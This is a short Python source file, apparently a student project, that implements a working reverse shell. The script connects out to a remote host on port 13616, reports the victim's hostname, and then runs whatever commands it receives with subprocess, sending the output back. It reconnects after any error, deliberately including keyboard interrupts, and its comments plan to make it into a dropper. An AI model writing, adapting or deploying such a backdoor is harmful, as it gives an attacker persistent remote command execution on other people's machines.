"""
A python reverse shell
Author: MeepStryker
This code is terrible right now and does not have clean exception handling
"""

# TODO QoL: determine Linux vs Windows
# TODO QoL: send proper FQDN based on OS
# TODO QoL: create more os-specific versions & change to dropper

import socket
import subprocess
# import os
import time


def main():
    # main loop
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            hostname = "{ddns}.student.rit.edu"
            ip = socket.gethostbyname(hostname)
            port = 13616
            s.connect((ip, port))
            s.send("meepster".encode())
            victimhost = subprocess.getoutput("hostname")
            # TODO FIXME: unreliable FQDN
            # gets windows FQDN (error in linux)
            # temp = subprocess.getoutput("ipconfig | findstr \"DNS\"")
            # temp = temp.replace('Connection-specific DNS Suffix  . : ', '')
            # temp = temp.strip()
            # temp = temp[0:-1]
            # victimhost += "." + temp
            time.sleep(1)
            s.send(victimhost.encode())
            # command loop
            # wait for instructions, execute, send output, repeat
            while True:
                command = s.recv(1024).decode()
                output = subprocess.getoutput(command)
                s.send(output.encode())
        except:
            # any exception will make it open the connection again
            # this includes SIGINT/Keyboard Interrupt :)
            pass


if __name__ == "__main__":
    main()
